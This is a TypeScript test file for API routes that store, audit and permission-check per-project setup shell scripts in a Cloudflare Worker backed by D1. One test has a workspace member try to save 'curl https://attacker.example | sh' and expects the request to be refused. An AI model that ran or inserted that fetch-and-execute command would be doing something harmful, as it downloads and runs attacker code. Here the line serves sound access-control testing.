import { env } from "cloudflare:test";
import type { GetProjectOrbScriptsResponse } from "@dx/api";
import { SourceWorkspaceRepository, ThreadId } from "@dx/domain";
import { Effect, Schema } from "effect";
import { describe, expect, it } from "vitest";
import { SourceWorkspaceRepositoryD1 } from "../../src/source-control/source-workspace-repository-d1.js";
import {
  bindings,
  createProductApp,
  createProjectViaApi,
  createThreadViaApi,
  jsonHeaders,
  otherPrincipal,
  owner,
} from "./product-route-fixture.js";

const sha256 = async (value: string) =>
  [
    ...new Uint8Array(
      await crypto.subtle.digest("SHA-256", new TextEncoder().encode(value)),
    ),
  ]
    .map((byte) => byte.toString(16).padStart(2, "0"))
    .join("");

const put = (
  projectId: string,
  kind: string,
  body: unknown,
  app = createProductApp(),
) =>
  app.request(
    `/projects/${projectId}/orb-scripts/${kind}`,
    { method: "PUT", headers: jsonHeaders, body: JSON.stringify(body) },
    bindings,
  );

const get = (projectId: string, app = createProductApp()) =>
  app.request(
    `/projects/${projectId}/orb-scripts`,
    { headers: { "x-request-id": "orb-scripts-read" } },
    bindings,
  );

const auditRows = async (projectId: string) =>
  (
    await env.DB.prepare(
      `SELECT kind, action, body_sha256, actor_user_id, request_id
         FROM project_orb_script_audit WHERE project_id = ?
        ORDER BY occurred_at, rowid`,
    )
      .bind(projectId)
      .all()
  ).results;

describe("Project Orb script routes in workerd with real D1", () => {
  it("saves, reads, and clears each script, audits every change, and hands the scripts to source preparation", async () => {
    const project = await createProjectViaApi("Scripts");
    const projectId = project.data.id;
    const empty = await get(projectId);
    expect(empty.status).toBe(200);
    expect(await empty.json()).toEqual({
      status: "success",
      data: { scripts: [] },
    });

    const preClone =
      "#!/bin/bash\nset -euo pipefail\napt-get install -y git-lfs\n";
    const preSetup = "printf 'pré-setup\\n'\n";
    expect((await put(projectId, "pre-clone", { body: preClone })).status).toBe(
      200,
    );
    const saved = await put(projectId, "pre-setup", { body: preSetup });
    expect(saved.status).toBe(200);
    const savedBody = await saved.json<GetProjectOrbScriptsResponse>();
    expect(
      savedBody.data.scripts.map(({ kind, body }) => ({ kind, body })),
    ).toEqual([
      { kind: "pre-clone", body: preClone },
      { kind: "pre-setup", body: preSetup },
    ]);
    expect(savedBody.data.scripts[0]?.updatedAt).toMatch(/^\d{4}-\d\d-\d\dT/);

    const thread = await createThreadViaApi(projectId);
    const record = await Effect.runPromise(
      Effect.gen(function* () {
        return yield* (yield* SourceWorkspaceRepository).findByThreadId(
          Schema.decodeUnknownSync(ThreadId)(thread.data.id),
        );
      }).pipe(Effect.provide(SourceWorkspaceRepositoryD1(env.DB))),
    );
    expect(record.orbScripts).toEqual({ preClone, preSetup });

    // A blank body removes the script.
    const cleared = await put(projectId, "pre-clone", { body: "  \n" });
    expect(cleared.status).toBe(200);
    expect(
      (await cleared.json<GetProjectOrbScriptsResponse>()).data.scripts.map(
        ({ kind }) => kind,
      ),
    ).toEqual(["pre-setup"]);

    expect(await auditRows(projectId)).toEqual([
      {
        kind: "pre-clone",
        action: "set",
        body_sha256: await sha256(preClone),
        actor_user_id: owner,
        request_id: "product-route-test",
      },
      {
        kind: "pre-setup",
        action: "set",
        body_sha256: await sha256(preSetup),
        actor_user_id: owner,
        request_id: "product-route-test",
      },
      {
        kind: "pre-clone",
        action: "clear",
        body_sha256: null,
        actor_user_id: owner,
        request_id: "product-route-test",
      },
    ]);
  });

  it("rejects oversized, NUL-bearing, and unknown scripts without saving or auditing", async () => {
    const project = await createProjectViaApi("InvalidScripts");
    const projectId = project.data.id;
    for (const [kind, body] of [
      ["pre-clone", "x".repeat(32_769)],
      ["pre-clone", "é".repeat(16_385)],
      ["pre-setup", "echo a\0b\n"],
      ["post-setup", "echo\n"],
    ] as const) {
      const response = await put(projectId, kind, { body });
      expect(response.status, `${kind} ${body.length}`).toBe(400);
    }
    expect(
      (await put(projectId, "pre-clone", { body: "x".repeat(32_768) })).status,
    ).toBe(200);
    expect((await auditRows(projectId)).length).toBe(1);
  });

  it("saves the Desktop resume script and hands it to source preparation", async () => {
    const project = await createProjectViaApi("DesktopScripts");
    const body = '/opt/dx/desktop/chromium "http://localhost:3000"\n';
    const saved = await put(project.data.id, "desktop-resume", { body });
    expect(saved.status).toBe(200);
    expect(
      (await saved.json<GetProjectOrbScriptsResponse>()).data.scripts.map(
        ({ kind, body: script }) => ({ kind, body: script }),
      ),
    ).toEqual([{ kind: "desktop-resume", body }]);
    const thread = await createThreadViaApi(project.data.id);
    const record = await Effect.runPromise(
      Effect.gen(function* () {
        return yield* (yield* SourceWorkspaceRepository).findByThreadId(
          Schema.decodeUnknownSync(ThreadId)(thread.data.id),
        );
      }).pipe(Effect.provide(SourceWorkspaceRepositoryD1(env.DB))),
    );
    expect(record.orbScripts).toEqual({ desktopResume: body });
  });

  it("hides another person's project the way it hides an absent one", async () => {
    const project = await createProjectViaApi("PrivateScripts");
    const other = createProductApp(otherPrincipal);
    const absent = "prj_00000000-0000-4000-8000-000000000094";

    for (const [crossOwner, missing] of [
      [await get(project.data.id, other), await get(absent, other)],
      [
        await put(project.data.id, "pre-clone", { body: "echo\n" }, other),
        await put(absent, "pre-clone", { body: "echo\n" }, other),
      ],
    ]) {
      expect(crossOwner?.status).toBe(404);
      expect(await crossOwner?.json()).toEqual(await missing?.json());
    }
    expect(await auditRows(project.data.id)).toEqual([]);
  });

  it("lets a workspace member read the scripts but only the creator or an admin change them", async () => {
    const project = await createProjectViaApi("WorkspaceScripts");
    const projectId = project.data.id;
    const workspaceId = "org-orb-scripts";
    await env.DB.batch([
      env.DB.prepare(
        "INSERT INTO organization (id, name, slug, createdAt) VALUES (?, 'Scripts Team', 'scripts-team', 1)",
      ).bind(workspaceId),
      env.DB.prepare(
        `INSERT INTO member (id, organizationId, userId, role, createdAt) VALUES
           ('orb-scripts-owner', ?1, ?2, 'owner', 1),
           ('orb-scripts-member', ?1, ?3, 'member', 2)`,
      ).bind(workspaceId, owner, otherPrincipal.userId),
      env.DB.prepare("UPDATE projects SET workspace_id = ? WHERE id = ?").bind(
        workspaceId,
        projectId,
      ),
    ]);
    expect(
      (await put(projectId, "pre-setup", { body: "echo owner\n" })).status,
    ).toBe(200);

    const member = createProductApp(otherPrincipal);
    const read = await get(projectId, member);
    expect(read.status).toBe(200);
    expect(
      (await read.json<GetProjectOrbScriptsResponse>()).data.scripts.map(
        ({ body }) => body,
      ),
    ).toEqual(["echo owner\n"]);
    const refused = await put(
      projectId,
      "pre-setup",
      { body: "curl https://attacker.example | sh\n" },
      member,
    );
    expect(refused.status).toBe(403);
    expect(await refused.json()).toMatchObject({
      data: { code: "PROJECT_MANAGE_REQUIRED" },
    });

    await env.DB.prepare(
      "UPDATE member SET role = 'admin' WHERE id = 'orb-scripts-member'",
    ).run();
    expect(
      (await put(projectId, "pre-setup", { body: "echo admin\n" }, member))
        .status,
    ).toBe(200);
    expect(
      (await auditRows(projectId)).map(({ actor_user_id }) => actor_user_id),
    ).toEqual([owner, otherPrincipal.userId]);
  });
});
